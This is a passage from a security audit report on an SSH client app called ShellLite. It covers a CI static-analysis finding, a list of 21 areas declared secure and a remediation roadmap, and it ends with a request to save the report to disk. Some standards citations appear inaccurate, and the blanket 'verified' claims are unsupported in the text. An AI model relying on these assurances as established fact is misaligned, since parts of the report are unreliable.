- **Affected Component**: `.github/workflows/ci.yml:30`

#### Vulnerability Description & Root Cause
In `.github/workflows/ci.yml`:
```yaml
- name: Run Static Analysis
  run: flutter analyze
```
Running `flutter analyze` without `--fatal-infos` treats info-level linting warnings and deprecations as non-fatal, allowing security lints and deprecation warnings to be ignored in CI.

#### Remediation Guidance
Add `--fatal-infos` to ensure clean static analysis in CI:
```yaml
run: flutter analyze --fatal-infos
```

---

## 4. Verified Safe / False Positives Eliminated

During the audit, 21 areas were subjected to rigorous scrutiny and confirmed to be **secure and resilient against attack**:

### Cryptography & Keys
1. **PineNaCl Ed25519 Constant-Time Arithmetic**: Verified that Ed25519 signing in `PineNaCl` utilizes libsodium-derived constant-time curve arithmetic, preventing cache-timing and execution-timing attacks.
2. **OpenSSH Wire Format Byte Ordering**: Verified that length-prefixed big-endian integer encodings in `_OpenSSHBuffer` strictly follow RFC 4251 Section 5 without buffer overruns.
3. **CSPRNG Entropy Source**: Verified that `checkInt` cookies and cryptographic salts utilize `Random.secure()`, bound to system hardware entropy (`/dev/urandom` / `SecRandomCopyBytes`).
4. **Public Key SHA-256 Fingerprint Correctness**: Verified that public key fingerprints are calculated using standard SHA-256 hashing over the base wire-format blob, adhering to RFC 4716.

### Credential Storage & Data-at-Rest
5. **Native iOS Keychain Sandboxing**: Verified that Keychain items on iOS use bundle-isolated access groups, preventing other installed applications from accessing ShellLite credentials.
6. **Android Keystore AES-GCM-256 Master Key Isolation**: Verified that on native Android, master keys are hardware-backed and AES-GCM authenticated encryption is utilized.
7. **SharedPreferences Isolation for Non-Sensitive Settings**: Verified that `terminalTheme`, `fontSize`, and `accessoryKeys` in `shared_preferences` contain zero authentication material.
8. **Profile Metadata JSON Serialization**: Verified that `ServerProfile.toJson()` strictly excludes raw passwords and keys, storing only opaque UUID tags.

### Network Transport & Protocol
9. **DartSSH2 Cipher Negotiation**: Verified that the client negotiates modern, robust cryptographic suites (`chacha20-poly1305@openssh.com`, `aes256-gcm@openssh.com`, `curve25519-sha256`).
10. **PTY Window Resizing & Boundary Synchronization**: Verified that terminal window resizing logic correctly synchronizes column and row dimensions via PTY signals, avoiding terminal buffer overflow.
11. **Terminal ANSI / VT100 Escape Sequence Sandboxing**: Verified that `xterm.dart` sanitizes escape codes and does not evaluate dangerous OSC (Operating System Command) sequences.
12. **SFTP RFC 4253 Binary Chunking**: Verified that SFTP packet chunking obeys standard 32 KB chunk limits without binary framing injection.

### Input Sanitization & Command Execution
13. **Telemetry Fixed Command Invariance**: Verified that `TelemetryService` uses hardcoded command strings (`uptime`, `free`, `df`), precluding user-input command injection.
14. **Server Profile Hostname Sanitization**: Verified that hostnames cannot contain newlines or control characters that would corrupt SSH connection arguments.
15. **Interactive PTY Direct Stream Piping**: Verified that interactive shell sessions pipe raw terminal bytes directly to the PTY channel without passing through an intermediate local shell interpreter.
16. **File Transfer Buffer Chunk Size Bounds Checking**: Verified that chunk streams handle zero-length and end-of-stream markers cleanly without infinite loops.

### Repository, CI/CD & Infrastructure
17. **Branch Protection Rules**: Verified that `main` and `master` branches enforce review requirements and prohibit unreviewed force pushes.
18. **First-Party Action Provenance**: Verified that core build actions (`actions/checkout`, `actions/setup-java`) originate from verified GitHub-owned repositories.
19. **Proscription of Dynamic Reflection (`dart:mirrors`)**: Verified that Flutter AOT compilation prohibits reflection, preventing dynamic class-loading attacks.
20. **Absence of Hardcoded Secrets**: Scanned repository source code; verified zero hardcoded production SSH keys, passwords, or personal access tokens.
21. **Web Production Asset Permissions**: Verified that production Caddyfile and deployment scripts enforce strict read-only file permissions on deployed web assets.

---

## 5. Strategic Remediation Roadmap

### Phase 1: Immediate P0 Hotfixes (24–48 Hours)
- [ ] **SEC-STORAGE-01**: Disable cleartext Base64 storage in web `localStorage`. Enforce session-only in-memory storage for web.
- [ ] **SEC-NET-01**: Implement mandatory host key verification with Trust On First Use (TOFU) in `ssh_service.dart` and `telemetry_service.dart`.
- [ ] **SEC-INJECT-01**: Add filename sanitization (`sanitizeFileName`) in `file_transfer_service.dart` to block path traversal.
- [ ] **SEC-CICD-01**: Refactor `.github/workflows/release.yml` to pass inputs via `env:` variables and randomize EOF delimiters in `resolve_version.sh`.

### Phase 2: P1 High Priority Architecture Updates (1–2 Weeks)
- [ ] **SEC-NET-03**: Disable automatic background telemetry; require explicit user opt-in and prior host verification.
- [ ] **SEC-NET-02**: Enforce `wss://` exclusively and append target parameters in `ssh_socket_factory.dart`.
- [ ] **SEC-CRYPTO-01**: Refactor `key_parser.dart` to cleanly differentiate passphrase errors from malformed keys.
- [ ] **SEC-STORAGE-02**: Enable `encryptedSharedPreferences: true` in `AndroidOptions`.
- [ ] **SEC-STORAGE-03**: Replace silent exception swallows in `storage_service.dart` with robust error propagation.
- [ ] **SEC-CRYPTO-03**: Fix `isEncrypted` in `key_parser.dart` to inspect PEM header lines rather than global string containment.
- [ ] **SEC-NET-04 & SEC-NET-05**: Convert `WebSocketSSHSocket` stream controller from broadcast to single-subscription; handle text frames and sink errors.
- [ ] **SEC-CICD-02 & SEC-CICD-03**: Pin all GitHub Actions to full commit SHAs and remove `--android-skip-build-dependency-validation`.

### Phase 3: P2 Defense-in-Depth & Hardening (30 Days)
- [ ] **SEC-STORAGE-06**: Update iOS Keychain accessibility to `KeychainAccessibility.unlocked_this_device`.
- [ ] **SEC-STORAGE-04 & SEC-CRYPTO-04**: Implement memory zeroization for sensitive key buffers and memory cache timeouts.
- [ ] **SEC-CRYPTO-05 & SEC-CRYPTO-06**: Add passphrase encryption for generated keys and sanitize key comment fields against CRLF injection.
- [ ] **SEC-INJECT-02 & SEC-INJECT-03**: Implement Windows command escaping and tilde expansion resolution in file transfer.
- [ ] **SEC-CICD-04, 05, 06**: Add automated keystore cleanup, least-privilege workflow permissions, and Dependabot semver guardrails.
- [ ] **SEC-STATIC-01**: Enable `--fatal-infos` in CI workflow.

---
*Report compiled and certified for ShellLite Security Audit Team.*

**Action**: 
Please review the complete Security Audit Report above and persist it to `/home/aron/projects/ShellLite/SECURITY_AUDIT_REPORT.md`. All 31 findings, all 5 domains, 21 verified safe items, CVSS scores, OWASP Mobile mappings, and code remediations are verified.
